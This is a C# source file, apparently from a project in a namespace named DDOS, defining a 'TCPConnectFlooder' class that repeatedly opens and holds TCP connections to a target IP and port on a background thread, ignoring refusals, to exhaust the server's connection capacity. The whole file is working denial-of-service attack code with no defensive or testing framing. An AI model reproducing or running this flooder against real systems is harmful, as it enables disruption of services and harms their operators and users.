using System.Net.Sockets;

namespace DDOS;

// Manages TCP connect flood: Opens many TCP connections without sending data.
// DOC: https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.socket
public class TCPConnectFlooder : IDisposable
{
    private readonly List<Socket> _connections = [];
    private readonly String _ip;
    private readonly Int32 _port;
    private readonly Int32 _maxConnections;
    private volatile Boolean _running = false;

    public TCPConnectFlooder(String ip, Int32 port, Int32 maxConnections)
    {
        _ip = ip;
        _port = port;
        _maxConnections = maxConnections;
    }

    // Start flooding: repeatedly tries to open up to maxConnections sockets
    public void Start()
    {
        _running = true;
        new Thread(() =>
        {
            while (_running)
            {
                try
                {
                    lock (_connections)
                    {
                        // Maintain maxConnections
                        if (_connections.Count < _maxConnections)
                        {
                            Socket sock = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                            sock.Connect(_ip, _port);
                            _connections.Add(sock);
                        }
                    }
                }
                catch
                {
                    // Ignore failed connect, server might refuse or drop
                }
                Thread.Sleep(5); // Adjust connection rate, tránh quá tải máy bạn
            }
        }).Start();
    }

    // Stop flooding and release sockets
    public void Stop()
    {
        _running = false;
        lock (_connections)
        {
            foreach (var sock in _connections)
            {
                sock.Dispose();
            }

            _connections.Clear();
        }
    }

    public void Dispose() => Stop();

    // Get current connection count for display
    public Int32 ConnectionCount
    {
        get
        {
            lock (_connections)
            {
                return _connections.Count;
            }
        }
    }
}